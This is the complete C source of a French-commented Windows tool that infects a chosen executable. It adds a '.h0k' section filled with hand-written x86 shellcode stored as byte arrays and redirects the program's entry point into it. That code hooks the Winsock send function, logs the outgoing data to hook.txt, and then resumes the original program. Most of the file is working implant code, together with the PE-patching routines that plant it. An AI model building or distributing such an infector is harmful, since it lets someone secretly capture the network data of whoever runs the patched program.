#define snprintf _snprintf

#include "Resource.h"

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

IMAGE_DOS_HEADER DosHeader;
IMAGE_NT_HEADERS PeHeader;
IMAGE_SECTION_HEADER *section;
HINSTANCE hInst;
HWND hWnd, hTmp;
HANDLE hFile, hResult;
DWORD Bytes;
char *buff;

/**************************************************************************************************/
/**************************************************************************************************/
/*****************************************Declaration des parties du hooker************************/
/**************************************************************************************************/
/**************************************************************************************************/

unsigned char part1[192] = {
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x57, 0x53, 0x32, 0x5F, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x73,
	0x65, 0x6E, 0x64, 0x00, 0x68, 0x6F, 0x6F, 0x6B, 0x2E, 0x74, 0x78, 0x74, 0x00, 0x57, 0x72, 0x69,
	0x74, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x00, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6C,
	0x65, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x8B, 0x15, 0x30, 0x00, 0x00, 0x00, 0x8B,
	0x42, 0x0C, 0x8B, 0x70, 0x1C, 0x8B, 0x06, 0x8B, 0x50, 0x08, 0x89, 0x55, 0xFC, 0x8B, 0x52, 0x3C,
	0x03, 0x55, 0xFC, 0x8B, 0x52, 0x78, 0x03, 0x55, 0xFC, 0x89, 0x55, 0xF8, 0x33, 0xC0, 0x83, 0xC2,
	0x20, 0x8B, 0x12, 0x03, 0x55, 0xFC, 0x89, 0x55, 0xE8, 0x33, 0xC9, 0x8B, 0x5D, 0xE8, 0x8B, 0x1B,
	0x03, 0x5D, 0xFC, 0x81, 0x3B, 0x47, 0x65, 0x74, 0x50, 0x75, 0x0B, 0x81, 0x7B, 0x04, 0x72, 0x6F,
	0x63, 0x41, 0x75, 0x02, 0xEB, 0x0C, 0x66, 0x83, 0x45, 0xE8, 0x04, 0x66, 0x83, 0x45, 0xEC, 0x01,
	0xEB, 0xD7, 0x8B, 0x5D, 0xEC, 0x6B, 0xDB, 0x04, 0x89, 0x5D, 0xEC, 0x8B, 0x5D, 0xF8, 0x83, 0xC3,
	0x1C, 0x8B, 0x1B, 0x03, 0x5D, 0xFC, 0x03, 0x5D, 0xEC, 0x8B, 0x1B, 0x03, 0x5D, 0xFC, 0x89, 0x1D};
unsigned char part2[13] = {0xC3, 0x55, 0x8B, 0xEC, 0x8B, 0x45, 0x08, 0x50, 0xFF, 0x75, 0x20, 0xFF, 0x15};
unsigned char part3[27] = {
	0x8B, 0xE5, 0x5D, 0xC2, 0x04, 0x00, 0x55, 0x8B, 0xEC, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A,
	0x00, 0x6A, 0x00, 0x6A, 0x00, 0xE8, 0x59, 0xFF, 0xFF, 0xFF, 0x68};
unsigned char part4[6] = {0xE8, 0xCC, 0xFF, 0xFF, 0xFF, 0xA3};
unsigned char part5[1] = {0x68};
unsigned char part6[6] = {0xE8, 0xBD, 0xFF, 0xFF, 0xFF, 0xA3};
unsigned char part7[24] = {
	0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x58, 0x08, 0x8B, 0xC3, 0x03, 0x43, 0x3C, 0x8B, 0x80,
	0x80, 0x00, 0x00, 0x00, 0x03, 0xC3, 0x8D, 0x35};
unsigned char part8[57] = {
	0x8B, 0x78, 0x0C, 0x23, 0xFF, 0x0F, 0x84, 0x88, 0x00, 0x00, 0x00, 0x03, 0xFB, 0xB9, 0x0A, 0x00,
	0x00, 0x00, 0xF3, 0xA6, 0x23, 0xC9, 0x75, 0x08, 0x8A, 0x0F, 0x22, 0xC9, 0x75, 0x02, 0xEB, 0x05,
	0x83, 0xC0, 0x14, 0xEB, 0xD5, 0x33, 0xD2, 0x50, 0x8B, 0x00, 0x03, 0xC3, 0x8B, 0x38, 0x23, 0xFF,
	0x74, 0x61, 0x03, 0xFB, 0x83, 0xC7, 0x02, 0x8D, 0x35};
unsigned char part9[37] = {
	0xB9, 0x04, 0x00, 0x00, 0x00, 0xF3, 0xA6, 0x23, 0xC9, 0x75, 0x08, 0x8A, 0x0F, 0x22, 0xC9, 0x75,
	0x02, 0xEB, 0x06, 0x42, 0x83, 0xC0, 0x04, 0xEB, 0xD6, 0x58, 0x8B, 0x40, 0x10, 0x03, 0xC3, 0x6B,
	0xD2, 0x04, 0x03, 0xC2, 0xA3};
unsigned char part10[4] = {0x8B, 0x18, 0x89, 0x1D};
unsigned char part11[2] = {0xC7, 0x00};
unsigned char part12[16] = {
	0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x04, 0x68};
unsigned char part13[2] = {0xFF, 0x15};
unsigned char part14[1] = {0xA2};
unsigned char part15[9] = {0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x33, 0xC0, 0xB8};
unsigned char part16[8] = {0xFF, 0xE0, 0x55, 0x8B, 0xEC, 0x33, 0xC0, 0xA0};
unsigned char part17[9] = {0x8B, 0x5D, 0x0C, 0x8B, 0x4D, 0x10, 0x6A, 0x00, 0x68};
unsigned char part18[5] = {0x51, 0x53, 0x50, 0xFF, 0x15};
unsigned char part19[5] = {0x8B, 0xE5, 0x5D, 0xFF, 0x25};

/**************************************************************************************************/
/**************************************************************************************************/
/***************************Routines( Provenant d'un projet de Virtualabs )************************/
/**************************************************************************************************/
/**************************************************************************************************/
/* Ces routines ont été faites par Virtualabs www.oldhopes.tk au temps où nous nous intéressions  */
/* au packing. Et ces routines sont parfaites et donc je ne vois pas l'intéret de les modifier.   */

long Alignement(long taille, long alignement)
{
	if (taille % alignement != 0)
		taille = (taille - taille % alignement) + alignement;
	return taille;
}

long FindNextRVA()
{
	long a, max = 0, next = 0;
	for (a = 0; a < PeHeader.FileHeader.NumberOfSections; a++)
	{
		if (section[a].VirtualAddress > max)
		{
			max = section[a].VirtualAddress;
			next = max + Alignement(section[a].Misc.VirtualSize, PeHeader.OptionalHeader.SectionAlignment);
		}
	}
	return next;
}

long FindNextOffset()
{
	long a, max = 0, next = 0;
	for (a = 0; a < PeHeader.FileHeader.NumberOfSections; a++)
	{
		if (section[a].PointerToRawData > max)
		{
			max = section[a].PointerToRawData;
			next = max + Alignement(section[a].SizeOfRawData, PeHeader.OptionalHeader.FileAlignment);
		}
	}
	return next;
}

/**************************************************************************************************/

void DoAnalyseFile()
{
	OPENFILENAME ofn;
	char FileName[256];
	memset(FileName, 0x00, 256);
	ZeroMemory(&ofn, sizeof(OPENFILENAME));
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.hwndOwner = hWnd;
	ofn.hInstance = NULL;
	ofn.lpstrCustomFilter = NULL;
	ofn.nMaxCustFilter = 0;
	ofn.nFilterIndex = 0;
	ofn.lpstrFile = FileName;
	ofn.nMaxFile = 256;
	ofn.lpstrFileTitle = NULL;
	ofn.nMaxFileTitle = 256;
	ofn.lpstrTitle = NULL;
	ofn.Flags = 0;
	ofn.nFileOffset = 0;
	ofn.nFileExtension = 0;
	ofn.lpstrDefExt = "exe";
	ofn.lCustData = 0L;
	ofn.lpfnHook = NULL;
	ofn.lpTemplateName = NULL;
	ofn.lpstrFilter = "Application (*.exe)\0*.exe\0";
	ofn.lpstrTitle = "Choisir l'application";

	if (!(GetOpenFileName(&ofn)))
	{
		MessageBox(NULL, TEXT("Impossible d'ouvrir le fichier !"), TEXT("Erreur"), MB_OK | MB_ICONWARNING);
		return;
	}

	hFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);

	ReadFile(hFile, &DosHeader, sizeof(IMAGE_DOS_HEADER), &Bytes, 0);

	if (DosHeader.e_magic != IMAGE_DOS_SIGNATURE)
	{
		MessageBox(NULL, TEXT("La signature MS DOS n'est pas bonne"), TEXT("Erreur"), MB_OK | MB_ICONWARNING);
		CloseHandle(hFile);
		return;
	}

	SetFilePointer(hFile, DosHeader.e_lfanew, 0, 0);

	ReadFile(hFile, &PeHeader, sizeof(IMAGE_NT_HEADERS), &Bytes, 0);

	if (PeHeader.Signature != IMAGE_NT_SIGNATURE)
	{
		MessageBox(NULL, TEXT("La signature PE n'est pas bonne"), TEXT("Erreur"), MB_OK | MB_ICONWARNING);
		CloseHandle(hFile);
		return;
	}

	EnableWindow(GetDlgItem(hWnd, IDC_HOOK), true);

	char IB[10];
	snprintf(IB, 10, "0x%x", PeHeader.OptionalHeader.ImageBase);

	SetDlgItemText(hWnd, IDC_IMAGEBASE, IB);

	char EP[10];
	snprintf(EP, 10, "0x%x", PeHeader.OptionalHeader.AddressOfEntryPoint);

	SetDlgItemText(hWnd, IDC_ENTRYPOINT, EP);

	char SOI[10];
	snprintf(SOI, 10, "0x%x", PeHeader.OptionalHeader.SizeOfImage);

	SetDlgItemText(hWnd, IDC_SIZEOFIMAGE, SOI);

	char SA[10];
	snprintf(SA, 10, "0x%x", PeHeader.OptionalHeader.SectionAlignment);

	SetDlgItemText(hWnd, IDC_SECTIONSALIGNMENT, SA);

	char FA[10];
	snprintf(FA, 10, "0x%x", PeHeader.OptionalHeader.FileAlignment);

	SetDlgItemText(hWnd, IDC_FILEALIGNMENT, FA);

	char NOS[10];
	snprintf(NOS, 10, "%d", PeHeader.FileHeader.NumberOfSections);

	SetDlgItemText(hWnd, IDC_NUMBEROFSECTIONS, NOS);

	section = new IMAGE_SECTION_HEADER[PeHeader.FileHeader.NumberOfSections + 1];

	for (int s = 0; s < (PeHeader.FileHeader.NumberOfSections); s++)
	{
		char nom[9] = "";
		ReadFile(hFile, &section[s], sizeof(IMAGE_SECTION_HEADER), &Bytes, 0);

		if (!strncmp((char *)section[s].Name, (char *)".h0k", 8))
		{
			MessageBox(NULL, TEXT("Cette Application PE a déjà été h00ker"), TEXT("Erreur"), MB_OK | MB_ICONWARNING);
			EnableWindow(GetDlgItem(hWnd, IDC_HOOK), FALSE);
			CloseHandle(hFile);
			return;
		}
	}
}

void DoHookFile()
{

	// On modifie notre session
	strncpy((char *)&section[PeHeader.FileHeader.NumberOfSections].Name, ".h0k", 8);
	section[PeHeader.FileHeader.NumberOfSections].Misc.VirtualSize = PeHeader.OptionalHeader.SectionAlignment;
	section[PeHeader.FileHeader.NumberOfSections].VirtualAddress = FindNextRVA();
	section[PeHeader.FileHeader.NumberOfSections].SizeOfRawData = (PeHeader.OptionalHeader.FileAlignment * 2);
	section[PeHeader.FileHeader.NumberOfSections].PointerToRawData = FindNextOffset();
	section[PeHeader.FileHeader.NumberOfSections].PointerToRelocations = NULL;
	section[PeHeader.FileHeader.NumberOfSections].PointerToLinenumbers = NULL;
	section[PeHeader.FileHeader.NumberOfSections].NumberOfRelocations = NULL;
	section[PeHeader.FileHeader.NumberOfSections].NumberOfLinenumbers = NULL;
	section[PeHeader.FileHeader.NumberOfSections].Characteristics = 0xE0000020;

	unsigned long OEP, GetProc, WriteFi, CreateFi, IAT_API, API, Nom_Dll, Nom_Fonction, Nom_File, Nom_WriteFile, Nom_CreateFile, Bytess, HandleFile, FindGetProcAddress, Hook;
	OEP = PeHeader.OptionalHeader.AddressOfEntryPoint + PeHeader.OptionalHeader.ImageBase;
	GetProc = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase;
	WriteFi = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 4;
	CreateFi = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 8;
	IAT_API = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 12;
	API = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 16;
	Nom_Dll = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 20;
	Nom_Fonction = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 31;
	Nom_File = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 36;
	Nom_WriteFile = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 45;
	Nom_CreateFile = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 55;
	Bytess = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 67;
	HandleFile = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 71;
	FindGetProcAddress = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 72;
	Hook = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + PeHeader.OptionalHeader.ImageBase + 0x1CB;
	PeHeader.OptionalHeader.AddressOfEntryPoint = section[PeHeader.FileHeader.NumberOfSections].VirtualAddress + 0xDB;

	// On rajoute 1 au nb de sections
	PeHeader.FileHeader.NumberOfSections += 1;
	// On rajoute la taille de notre section a la taille totale
	PeHeader.OptionalHeader.SizeOfImage += PeHeader.OptionalHeader.SectionAlignment;

	for (int z = 0; z < PeHeader.FileHeader.NumberOfSections - 1; z++)
		section[z].Characteristics = 0xE0000020;

	hResult = CreateFile("Result.exe", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	WriteFile(hResult, &DosHeader, sizeof(IMAGE_DOS_HEADER), &Bytes, 0);
	SetFilePointer(hResult, DosHeader.e_lfanew, 0, 0);
	WriteFile(hResult, &PeHeader, sizeof(IMAGE_NT_HEADERS), &Bytes, 0);
	WriteFile(hResult, section, sizeof(IMAGE_SECTION_HEADER) * (PeHeader.FileHeader.NumberOfSections), &Bytes, 0);

	// Pour chaque section on se place a son debut et on lit la session puis on la reecrit dans l'autre fichier au meme endroit
	for (int a = 0; a < PeHeader.FileHeader.NumberOfSections - 1; a++)
	{
		buff = (char *)malloc(Alignement(section[a].SizeOfRawData, PeHeader.OptionalHeader.FileAlignment));
		SetFilePointer(hFile, section[a].PointerToRawData, 0, 0);
		ReadFile(hFile, buff, Alignement(section[a].SizeOfRawData, PeHeader.OptionalHeader.FileAlignment), &Bytes, 0);
		SetFilePointer(hResult, section[a].PointerToRawData, 0, 0);
		WriteFile(hResult, buff, Alignement(section[a].SizeOfRawData, PeHeader.OptionalHeader.FileAlignment), &Bytes, 0);
		free(buff);
	}

	// On rempli la taille de notre section par des 0
	for (a = 0; a < (PeHeader.OptionalHeader.FileAlignment * 2); a++)
		WriteFile(hResult, "\x00", 1, &Bytes, 0);
	// On se place au debut de notre section et on ecrit notre session
	SetFilePointer(hResult, section[PeHeader.FileHeader.NumberOfSections - 1].PointerToRawData, 0, 0);

	WriteFile(hResult, &part1, 192, &Bytes, 0);
	WriteFile(hResult, &GetProc, sizeof(GetProc), &Bytes, 0);
	WriteFile(hResult, &part2, 13, &Bytes, 0);
	WriteFile(hResult, &GetProc, sizeof(GetProc), &Bytes, 0);
	WriteFile(hResult, &part3, 27, &Bytes, 0);
	WriteFile(hResult, &Nom_CreateFile, sizeof(Nom_CreateFile), &Bytes, 0);
	WriteFile(hResult, &part4, 6, &Bytes, 0);
	WriteFile(hResult, &CreateFi, sizeof(CreateFi), &Bytes, 0);
	WriteFile(hResult, &part5, 1, &Bytes, 0);
	WriteFile(hResult, &Nom_WriteFile, sizeof(Nom_WriteFile), &Bytes, 0);
	WriteFile(hResult, &part6, 6, &Bytes, 0);
	WriteFile(hResult, &WriteFi, sizeof(WriteFi), &Bytes, 0);
	WriteFile(hResult, &part7, 24, &Bytes, 0);
	WriteFile(hResult, &Nom_Dll, sizeof(Nom_Dll), &Bytes, 0);
	WriteFile(hResult, &part8, 57, &Bytes, 0);
	WriteFile(hResult, &Nom_Fonction, sizeof(Nom_Fonction), &Bytes, 0);
	WriteFile(hResult, &part9, 37, &Bytes, 0);
	WriteFile(hResult, &IAT_API, sizeof(IAT_API), &Bytes, 0);
	WriteFile(hResult, &part10, 4, &Bytes, 0);
	WriteFile(hResult, &API, sizeof(API), &Bytes, 0);
	WriteFile(hResult, &part11, 2, &Bytes, 0);
	WriteFile(hResult, &Hook, sizeof(Hook), &Bytes, 0);
	WriteFile(hResult, &part12, 16, &Bytes, 0);
	WriteFile(hResult, &Nom_File, sizeof(Nom_File), &Bytes, 0);
	WriteFile(hResult, &part13, 2, &Bytes, 0);
	WriteFile(hResult, &CreateFi, sizeof(CreateFi), &Bytes, 0);
	WriteFile(hResult, &part14, 1, &Bytes, 0);
	WriteFile(hResult, &HandleFile, sizeof(HandleFile), &Bytes, 0);
	WriteFile(hResult, &part15, 9, &Bytes, 0);
	WriteFile(hResult, &OEP, sizeof(OEP), &Bytes, 0);
	WriteFile(hResult, &part16, 8, &Bytes, 0);
	WriteFile(hResult, &HandleFile, sizeof(HandleFile), &Bytes, 0);
	WriteFile(hResult, &part17, 9, &Bytes, 0);
	WriteFile(hResult, &Bytess, sizeof(Bytess), &Bytes, 0);
	WriteFile(hResult, &part18, 5, &Bytes, 0);
	WriteFile(hResult, &WriteFi, sizeof(WriteFi), &Bytes, 0);
	WriteFile(hResult, &part19, 5, &Bytes, 0);
	WriteFile(hResult, &API, sizeof(API), &Bytes, 0);

	CloseHandle(hFile);
	CloseHandle(hResult);
	return;
}

LRESULT CALLBACK Mainform(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_INITDIALOG:
		return TRUE;

	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDC_OPEN:
			if (HIWORD(wParam) == BN_CLICKED)
				DoAnalyseFile();
			return TRUE;
		case IDC_HOOK:
			if (HIWORD(wParam) == BN_CLICKED)
				DoHookFile();
			return TRUE;
		case IDC_STATIC:
			exit(1);
			return TRUE;
		}
		break;

	case WM_CLOSE:
		exit(0);
		return TRUE;
	}
	return FALSE;
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance;
	hWnd = CreateDialog(hInst, (LPCTSTR)IDD_MAIN, NULL, (DLGPROC)Mainform);
	if (!hWnd)
	{
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR lpCmdLine,
					 int nCmdShow)
{
	MSG msg;

	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 666;
}